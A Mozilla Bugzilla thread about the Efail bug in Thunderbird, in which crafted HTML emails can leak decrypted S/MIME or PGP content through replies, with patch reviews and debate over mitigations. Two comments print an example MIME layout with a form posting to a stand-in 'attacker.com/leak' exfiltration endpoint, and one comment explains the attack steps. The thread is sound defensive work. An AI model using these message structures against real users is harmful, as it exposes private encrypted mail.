Comment on [attachment 8973795](/attachment.cgi?id=8973795 "bug1419417_efail_reply_fwd.patch") [[details]](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") [[diff]](/attachment.cgi?id=8973795&action=diff "bug1419417_efail_reply_fwd.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795)
[bug1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")\_efail\_reply\_fwd.patch
Review of [attachment 8973795](/attachment.cgi?id=8973795 "bug1419417_efail_reply_fwd.patch") [[details]](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") [[diff]](/attachment.cgi?id=8973795&action=diff "bug1419417_efail_reply_fwd.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795):
-----------------------------------------------------------------
::: mailnews/compose/src/nsMsgCompose.cpp
@@ +1031,5 @@
>
> rv = composeService->DetermineComposeHTML(m\_identity, format, &m\_composeHTML);
> NS\_ENSURE\_SUCCESS(rv,rv);
>
> + // Make sure we only do plaintext encrypted replies/forwards.
That comment isn't clear. Are you saying that when replying to an encrypted HTLM message or forwarding it, we'll convert the reply or forwarded message to plaintext?
That's what the code appears to do. If the original was encrypted, the new message (reply/forwarded) will be converted to plaintext.
I can't see that this will be very popular. People might want to work around that with using "Edit as new". What happens in that case?

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1419417#c25)• 7 years ago |
|  | |

(In reply to Magnus Melin from [comment #23](/show_bug.cgi?id=1419417#c23 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Created [attachment 8973795](/attachment.cgi?id=8973795 "bug1419417_efail_reply_fwd.patch") [[details]](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") [[diff]](/attachment.cgi?id=8973795&action=diff "bug1419417_efail_reply_fwd.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795)
> [bug1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")\_efail\_reply\_fwd.patch
>
> Fix PoC 1 by only forwarding/replying to encrypted messages as plaintext.
> That is not the neatest fix, but at least it's safe.
I think this is a no-go for many users who use encrypted messages. Here is what I did in Enigmail: I (re-)parse the message to get the message structure (and then interpret the structure. If an unencrypted MIME part as a PGP/MIME encrypted sibling (i.e. MIME parts on the same level), then I display a warning to the user saying that the message may lead to revealing sensitive information. I would also agree that in this case conversion to plain text is a valid option.
See: <https://gitlab.com/enigmail/enigmail/blob/master/ui/content/enigmailMsgComposeOverlay.js#L562>

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1419417#c26)• 7 years ago |
|  | |

Hmm, but mixing of encrypted and non-encrypted is not really needed for this PoC is it?

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1419417#c27)• 7 years ago |
|  | |

(In reply to Jorg K (GMT+1) from [comment #24](/show_bug.cgi?id=1419417#c24 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> That comment isn't clear. Are you saying that when replying to an encrypted
> HTLM message or forwarding it, we'll convert the reply or forwarded message
> to plaintext?
That's what it does yes.

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1419417#c28)• 7 years ago |
|  | |

(In reply to Magnus Melin from [comment #26](/show_bug.cgi?id=1419417#c26 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Hmm, but mixing of encrypted and non-encrypted is not really needed for this
> PoC is it?
Yes, I think you a have to have a mixture. You have an apparently unencrypted HTML message that contains a hidden encrypted MIME part. The only way to achieve this is by a structure like below, which implies that a multipart/encrypted message is on the same level or below an unencrypted message part:
multipart/mixed 1.1
|--- Content-Type: text/html 1.1.1
| <form action="<https://attacker.com/leak>" method="post">
| <button type="submit">
| <textarea
|--- Content-Type: multipart/encrypted 1.1.2
Whether or not 1.1 is a sub-part of an encrypted message does not matter. Once you have the decrypted MIME tree, you need to have a mixture of non-encrypted and encrypted MIME parts. Otherwise the trick of hiding an encrypted message in an unencrypted message cannot work.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1419417#c29)• 7 years ago |
|  | |

Comment on [attachment 8973795](/attachment.cgi?id=8973795 "bug1419417_efail_reply_fwd.patch") [[details]](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") [[diff]](/attachment.cgi?id=8973795&action=diff "bug1419417_efail_reply_fwd.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795)
[bug1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")\_efail\_reply\_fwd.patch
Do we want to pursue this solution given ...
(In reply to Patrick Brunschwig from [comment #25](/show_bug.cgi?id=1419417#c25 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> I think this is a no-go for many users who use encrypted messages.
[Attachment #8973795](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") -
Flags: review?(jorgk)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1419417#c30)• 7 years ago |
|  | |

(In reply to Patrick Brunschwig from [comment #28](/show_bug.cgi?id=1419417#c28 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Yes, I think you a have to have a mixture. You have an apparently
> unencrypted HTML message that contains a hidden encrypted MIME part.
Is it not allowed to have encrypted parts as siblings? E.g. part 1.1.1 also being encrypted.
Sorry if it's a stupid question :)

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1419417#c31)• 7 years ago |
|  | |

(In reply to Magnus Melin from [comment #30](/show_bug.cgi?id=1419417#c30 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Is it not allowed to have encrypted parts as siblings? E.g. part 1.1.1 also
> being encrypted.
> Sorry if it's a stupid question :)
It's not a stupid question at all :) It's technically allowed and possible to have encrypted and non-encrypted parts as siblings. However, no email client would ever produce such a message. The only way to achieve such a message structure is to manually craft it, and therefore the user should be warned if he gets such a message.

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1419417#c32)• 7 years ago |
|  | |

Agreed with @Patrick. If part 1.1.1 is actually encrypted or not should be irrelevant for the attack (the attacker could do both).
The major problem imho is multiple MIME parts that are bleeding into each other -> attacker-controlled HTML/CSS content is mixed with sensitive, plaintext content, rendered into the same DOM. Given the evolution web standards, other variants of the attack may only be a matter of time. At least I would not trust mail encryption my life (but some people actually have to) :/
Btw, I like Enigmail's handling of PGP/INLINE where the whole email is forced to be rendered as text-only.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1419417#c33)• 7 years ago |
|  | |

(In reply to Jens Müller from [comment #32](/show_bug.cgi?id=1419417#c32 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Agreed with @Patrick. If part 1.1.1 is actually encrypted or not should be
> irrelevant for the attack (the attacker could do both).
I'm slightly confused now. Patrick said a mixture is required ([comment 28](/show_bug.cgi?id=1419417#c28 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")).
But from later comments, it sounds separately encrypted siblings is technically allowed and possible (for an attacker). The approach Enigmail took of warning if only one sibling was unencrypted would seem still attackable for that case.
> The major problem imho is multiple MIME parts that are bleeding into each
> other
Yes this is unfortunate and something I'd like to change - but it's a larger project to do that properly.

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1419417#c34)• 7 years ago |
|  | |

(In reply to Magnus Melin from [comment #33](/show_bug.cgi?id=1419417#c33 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> But from later comments, it sounds separately encrypted siblings is
> technically allowed and possible (for an attacker). The approach Enigmail
> took of warning if only one sibling was unencrypted would seem still
> attackable for that case.
You're right, my example is not complete. In my example in [comment #28](/show_bug.cgi?id=1419417#c28 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") the MIME part 1.1.1 could also be a multipart/encrypted message part which contains a text/html part. Or the structure could be like below, which would probably also be attack-able:
multipart/mixed 1.1
|--- Content-Type: text/html 1.1.1
| <form action="<https://attacker.com/leak>" method="post">
| <button type="submit">
| <textarea
|--- Content-Type: multipart/mixed 1.1.2
|--- Content-Type: multipart/encrypted 1.1.2.1
How about the following rule: there should be no "text/html" MIME part earlier in the tree than a "multipart/encrypted" MIME part - after everything earlier in the tree has been decrypted (i.e. tree traversal by depth first).
I'm not sure how to deal with message/rfc822 MIME parts though (attached messages).

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1419417#c35)• 7 years ago |
|  | |

We should make it possible to compose in html again, but for the moment I'd take this as a band-aid.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1419417#c36)• 7 years ago |
|  | |

What exactly is the attack vector? Do you have a test case and can you explain how the patch addresses the attack vector?
I just want to make sure we're not throwing out the baby with the bathwater given Patrick's [comment #25](/show_bug.cgi?id=1419417#c25 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
"I think this is a no-go for many users who use encrypted messages."
So a "no-go" doesn't appear very attractive even as a band-aid.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1419417#c37)• 7 years ago |
|  | |

Simply put: if you have encrypted messages for A that you want to read, send a mail to A, asking them a question so that A would reply. Craft the mail to secretly (like in the alternative content for a supported element) include the encrypted messages. The reply you get back now have all the content of the messages in decrypted from.
By converting to plain text the unintended messages are either removed in the html->plaintext process, or there clearly visible to the user in the reply window.
You could argue the attack requires you to obtain those encrypted mails, which may be easy or not, depending on what kind of an attacker you are. (Maybe you're the admin of the mail server, then it's easy.) But then again, to protect against these kind of attacks is the motivation to use encryption in the first place. Traffic between mail servers is largely secured nowadays.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1419417#c38)• 7 years ago |
|  | |

Oh, I understand the simple version ;-) Do you have a test message or instructions how to easily construct one? Or would you like me to send you a signed S/MIME message, so you can send a "crafted" encrypted one back?

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1419417#c39)• 7 years ago |
|  | |

I'll get back to you in the evening. But basically, in <https://bugzilla.mozilla.org/attachment.cgi?id=8930485> the red area would include decrypted content if you had the proper keys. (And would obviously be hidden by styling etc. in the real world)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1419417#c40)• 7 years ago |
|  | |

You mean [attachment 8930484](/attachment.cgi?id=8930484 "Decryption oracle PoC 1: Leaking plaintext through reply/forward") [[details]](/attachment.cgi?id=8930484&action=edit "Decryption oracle PoC 1: Leaking plaintext through reply/forward"), right, since that's the one for reply/forward.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1419417#c41)• 7 years ago |
|  | |

Attached file
[A1-dec-pgp-smime-html-reply.eml](attachment.cgi?id=8975458)
— [Details](attachment.cgi?id=8975458&action=edit)

OK, here's an example where I put an S/MIME block I can decrypt into a part of the message.
Upon HTML reply the decrypted text is found visibly in the body of the mail and is shipped out upon send.
Now let's try with the patch.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15025959_176914)• 7 years ago |

[Attachment #8975458](/attachment.cgi?id=8975458&action=edit "A1-dec-pgp-smime-html-reply.eml") -
Attachment mime type: message/rfc822 → text/plain

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1419417#c42)• 7 years ago |
|  | |

Comment on [attachment 8973795](/attachment.cgi?id=8973795 "bug1419417_efail_reply_fwd.patch") [[details]](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") [[diff]](/attachment.cgi?id=8973795&action=diff "bug1419417_efail_reply_fwd.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795)
[bug1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")\_efail\_reply\_fwd.patch
As far as I can see, this doesn't work. With the patch applied, the decrypted text is still present invisibly in the composition. Also, the composition is NOT downgraded to plaintext.
Looks like encryptedURIService->IsEncrypted(originalMsgURI, &isEncrypted); will return 'false' since only a message part is encrypted. I don't know, I haven't debugged it.
At least with the example I attached, "forward" doesn't appear to be an attack vector. I don't see the decrypted text anywhere in the forwarded message when inspecting the HTML.
[Attachment #8973795](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") -
Flags: review-

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1419417#c43)• 7 years ago |
|  | |

I would always run all cited text through the "HTML sanitizer" (Simple HTML). It will strip all funky HTML and leave only basic HTML in there. To avoid other attack vectors, I'd do that for all email, not just encrypted ones. I've seen other security and privacy bugs in HTML Replies, and that would stop them all cold. After all, it is only for quoting/citing.
The HTML sanitizer was made for cases like this: To be secure.
Going down to plaintext (even if only for encrypted mail) is IMHO a little too drastic and not necessary.

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1419417#c44)• 7 years ago |
|  | |

Ben, are you sure this would help in all cases? I suspect that you could still get a HTML tag containing hidden text which stems from a MIME part that was invisible at viewing time.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1419417#c45)• 7 years ago |
|  | |

Attached image
[tb-smime-leak-1.png](attachment.cgi?id=8975520) (obsolete)
— [Details](attachment.cgi?id=8975520&action=edit)

Screenshot, replying to attack email in HTML mode, Sanitized HTML mode and plaintext mode. Screenshot made without encryption for simplicity.
I can make a patch for that.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1419417#c46)• 7 years ago |
|  | |

Attached image
[tb-smime-leak-2.png](attachment.cgi?id=8975523)
— [Details](attachment.cgi?id=8975523&action=edit)

Sorry, labels were inverse. Fixed. Attached again. Sorry for the messup.
[Attachment #8975520](/attachment.cgi?id=8975520&action=edit "tb-smime-leak-1.png") -
Attachment is obsolete: true

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1419417#c47)• 7 years ago |
|  | |

> I suspect that you could still get a HTML tag containing hidden text which stems from a MIME part that was invisible at viewing time.
I'd have to test and check that.
However, just pasting encrypted text somewhere in the body wouldn't automatically decrypt it, would it?
If I understood the attack right, it bases on tricking the user into running a URL, either as <iframe> or <form> or <img> or style sheet or what have you. I am fairly confident that the sanitizer neutralizes all of these URL runs, at least that was its primary design goal.

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1419417#c48)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #47](/show_bug.cgi?id=1419417#c47 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> > I suspect that you could still get a HTML tag containing hidden text which stems from a MIME part that was invisible at viewing time.
>
> I'd have to test and check that.
>
> However, just pasting encrypted text somewhere in the body wouldn't
> automatically decrypt it, would it?
No, that wouldn't work.
According to the Efail authors, it's apparently also possible to play tricks with mixing double and single quotes in a clever way in HTML. Is this also sanitized?

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1419417#c49)• 7 years ago |
|  | |

Paper:
<https://efail.de/>
<https://efail.de/efail-attack-paper.pdf>
News:
<https://www.wired.com/story/efail-encrypted-email-flaw-pgp-smime/>
<https://www.theregister.co.uk/2018/05/14/smime_pgp_encryption_flaw_emails_vulnerable_to_snooping/>
<https://www.washingtonpost.com/news/the-switch/wp/2018/05/14/hackers-could-be-reading-your-encrypted-emails-heres-how/?noredirect=on&utm_term=.c45189fc8dce>
<https://www.heise.de/security/artikel/PGP-und-S-MIME-So-funktioniert-Efail-4048873.html>URL: <https://efail.de/>

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=1419417#c50)• 7 years ago |
|  | |

For end users, simple short-term mitigation: Enable menu View | Message Body as | Simple HTML.
That should run all HTML mail parts through the sanitizer before it hits other parts of Thunderbird and remove active URLs, at least that's the basic idea. I'll have to test each PoC to check whether one of them slips through, though.

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=1419417#c51)• 7 years ago |
|  | |

For the moment I'm recommending to use view messages as Plain text, which should prevent any remote URLs.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=1419417#c52)• 7 years ago |
|  | |

"Remote URLs"? I thought the case we're discussion here is the "direct exfiltration" where decrypted parts get included invisibly in the reply.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=1419417#c53)• 7 years ago |
|  | |

Yes that's the case for trunk/beta. But until 52.8 is out the other cases are an issue.

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=1419417#c54)• 7 years ago |
|  | |

I think that sanitizing the HTML tree for replies is a good idea.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15116996_22599)• 7 years ago |

Blocks: [efail](/show_bug.cgi?id=1420217 "RESOLVED DUPLICATE - [efail] Full Plaintext Leak in PGP")

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=1419417#c55)• 7 years ago |
|  | |

I think I have a fix.
Magnus, do you mind, if I take this?

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=1419417#c56)• 7 years ago |
|  | |

Not at all, here you go.Assignee: mkmelin+mozilla → ben.buckschStatus: ASSIGNED → NEW

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=1419417#c57)• 7 years ago |
|  | |

After discussing with Patrick, we both think there are several issues at work here, and that this problem needs 3 different fixes:
1. Separate MIME parts from each other
We currently output a cut-off HTML document, and concatenate that with other MIME parts, and construct a single document out of all these MIME parts. This is the cardinal bug here.
The correct solution here is to jail each MIME part into a separate <iframe type="content"> in the UI.
However, we don't want one scrollbar for each MIME part, but one scroll for the entire body. <iframe seamless> would allow that, but it was never implemented in Firefox and is now dead. We might later find a workaround, but this is more work and can't be done short term.
Together, we had the idea of running the HTML document through the HTML parser. The parser will clean up the HTML and close any open tags and attributes and the serializer will output a complete HTML document. That avoids that we end the MIME part with <img src=" and stops this attack cold.
It's not pretty, it's slower, and it's not a perfect solution, but it should fix the bug here, and all known variants of it.
2. Sanitize quoted HTML
The composer is more vulnerable than the viewer. In the viewer, we assume malicious code and harden against it. Not so in the composer, which assumes that the user enters the data.
After all, this is just a quote/cite. We only need to preserve the essence of it, enough for a citation.
That's why we should sanitize the HTML that we quote from the original message and insert into the user's mail.
This should close a whole class of attacks that
a) attack our composer
b) attack the recipients of our user
(which could lead to interesting constellations, esp. when it comes to decryption and trust)
So, I think this will be an important protection going forward.
3. Only decrypt, if the entire message is encrypted, not attachments
Normally, if we receive an encrypted email, the entire email will be encrypted. There's little point in leaving part of the message encrypted.
Part of the bug here was that we are automatically decrypting and inlining MIME subparts. That led to that "mixed content". Patrick had no way to stop that "mixed content" in Enigmail, because the code is in libmime.
We should only automatically decrypt a message, if the entire message is encrypted. That's true for all normal encrypted emails.
If an attachment is encrypted, we should simply show it as external attachment. The user can click on it to open or save it.
(In the first version of the patch, I might only allow saving the attachment, not opening it directly by double-click - depending on how difficult it is to implement.)
I have a good part of this already implemented. Patches will follow.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=1419417#c58)• 7 years ago |
|  | |

Thanks, Magnus! :-)Status: NEW → ASSIGNED

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=1419417#c59)• 7 years ago |
|  | |

Attached patch

[Sanitize quoted HTML](attachment.cgi?id=8976050&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976050&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050)

This is a fix for 2. Sanitize quoted HTML
I am not completely sure that I found all the necessary places to insert the code. My goal is to sanitize all foreign HTML content that's inserted into the composer, whereby "foreign" means anything not created by our user, anything coming from the network. If anybody knows additional places to cover, please let me know.
I've tested this by
1. setting View | Message body as | Original HTML
2. opening an Amazon HTML email
-> It display with colors and <table> boxes and everything, in the viewer
3. Clicking Reply
Without the patch:
-> The inserted quote has colors, boxes etc.
With the patch:
-> The inserted quote is the sanitized HTML version,
without colors, with broken remote images (as intended),
basically just text, but with links etc..
Same that you get with View | Message Body as | Simple HTML.
[Attachment #8976050](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 60](/show_bug.cgi?id=1419417#c60)• 7 years ago |
|  | |

Comment on [attachment 8976050](/attachment.cgi?id=8976050 "Sanitize quoted HTML") [[details]](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") [[diff]](/attachment.cgi?id=8976050&action=diff "Sanitize quoted HTML") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050)
Sanitize quoted HTML
Review of [attachment 8976050](/attachment.cgi?id=8976050 "Sanitize quoted HTML") [[details]](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") [[diff]](/attachment.cgi?id=8976050&action=diff "Sanitize quoted HTML") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050):
-----------------------------------------------------------------
::: mailnews/compose/src/nsMsgCompose.cpp
@@ +694,5 @@
> // This leaves the caret at the right place to insert a bottom signature.
> if (aHTMLEditor)
> + {
> + // Sanitize the HTML before injecting it into the composer
> + nsAutoString rawBody(aBuf);
Why a new variable? Can't you call HTMLSanitize(aBuf, ...)?
@@ +3215,5 @@
> {
> if (aHTMLEditor)
> + {
> + // Sanitize the HTML before injecting it into the composer
> + nsAutoString rawBody(mMsgBody);
Same here.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 61](/show_bug.cgi?id=1419417#c61)• 7 years ago |
|  | |

Attached patch

[Sanitize quoted HTML (cleaned-up)](attachment.cgi?id=8976054&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976054&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976054)

I've addressed the nits be removing the unneeded variables and I've added a proper patch header. Not sure why people still think they can submit raw diffs as patches. So reviewers have "Automatic r- if the patch doesn't contain a decent commit message" in their nick.
For the test message I attached, this works great! The decoded text becomes clearly visible in the composition.
However, forced general sanitisation of all quotes is not really acceptable. It destroys HTML replies for all users.
Can you please include a check whether the sanitisation is necessary? That's the tricky part, but you're on the right track.
Not sure whether this should be an f+ for the initiative and the promising approach or an f- for destroying things for everyone :-(
[Attachment #8976054](/attachment.cgi?id=8976054&action=edit "Sanitize quoted HTML (cleaned-up)") -
Flags: feedback-

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 62](/show_bug.cgi?id=1419417#c62)• 7 years ago |
|  | |

Comment on [attachment 8976050](/attachment.cgi?id=8976050 "Sanitize quoted HTML") [[details]](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") [[diff]](/attachment.cgi?id=8976050&action=diff "Sanitize quoted HTML") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050)
Sanitize quoted HTML
Missing commit message.
Superfluous variables.
Good approach, but too drastic since it affects HTML quoting for all users.
But I think we're not far off. Waiting for the next round.
[Attachment #8976050](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") -
Flags: review-

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15181785_101158)• 7 years ago |

[Attachment #8973795](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") -
Attachment is obsolete: true

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 63](/show_bug.cgi?id=1419417#c63)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> 2. Sanitize quoted HTML
>
> The composer is more vulnerable than the viewer. In the viewer, we assume
> malicious code and harden against it. Not so in the composer, which assumes
> that the user enters the data.
That used to be the case, but not so in 52 and above. The composer no is no longer treated differently (as an EDITOR).

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 64](/show_bug.cgi?id=1419417#c64)• 7 years ago |
|  | |

Comment on [attachment 8976050](/attachment.cgi?id=8976050 "Sanitize quoted HTML") [[details]](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") [[diff]](/attachment.cgi?id=8976050&action=diff "Sanitize quoted HTML") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050)
Sanitize quoted HTML
Review of [attachment 8976050](/attachment.cgi?id=8976050 "Sanitize quoted HTML") [[details]](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") [[diff]](/attachment.cgi?id=8976050&action=diff "Sanitize quoted HTML") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050):
-----------------------------------------------------------------
Yeah, I agree replying with basic html for everyone is too drastic.
It should also not be necessary if the other parts you mention are implemented.
[Attachment #8976050](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 65](/show_bug.cgi?id=1419417#c65)• 7 years ago |
|  | |

Maybe the code in mailnews/mime/src/mimecryp.cpp can tell us whether anything was decrypted while preparing the quote. I haven't looked. To find the right hook here would be the detective task. Sadly I don't know how it hangs together.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 66](/show_bug.cgi?id=1419417#c66)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> 1. Separate MIME parts from each other
> Together, we had the idea of running the HTML document through the HTML
> parser. The parser will clean up the HTML and close any open tags and
> attributes and the serializer will output a complete HTML document. That
> avoids that we end the MIME part with <img src=" and stops this attack cold.
I agree this is what's need to be done. It's not clear from your comment, but \*each html part\* should be run separately through the parser and re-serialized out - this makes sure there are no unclosed elements and other strangeness. After that you can keep the outputs it all together as one chunk again and let the parser figure out the final document.
If you can figure out where to do that, the bug is solved.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 67](/show_bug.cgi?id=1419417#c67)• 7 years ago |
|  | |

> \*each html part\* should be run separately through the parser and re-serialized out
Yes, that's the plan.
I've got a fix. Coming.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 68](/show_bug.cgi?id=1419417#c68)• 7 years ago |
|  | |

> replying with basic html for everyone is too drastic.
